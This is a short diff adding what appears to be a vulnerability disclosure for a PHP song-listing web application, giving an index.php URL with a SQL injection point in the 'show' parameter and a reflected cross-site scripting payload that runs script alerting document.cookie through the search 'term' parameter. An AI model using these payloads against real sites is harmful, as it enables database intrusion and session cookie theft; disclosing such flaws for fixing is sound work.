@@ -1,0 +1,8 @@
+
+vul1.sql injection:
+
+/index.php?action=top&amp;type=Songs&amp;show=10&#039;[ SQL ATTACK]
+ 
+Vul2.Cross site Scripting:
+ 
+/index.php?in=song&amp;term=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;%2Fscript&gt;&amp;action=search&amp;start=0
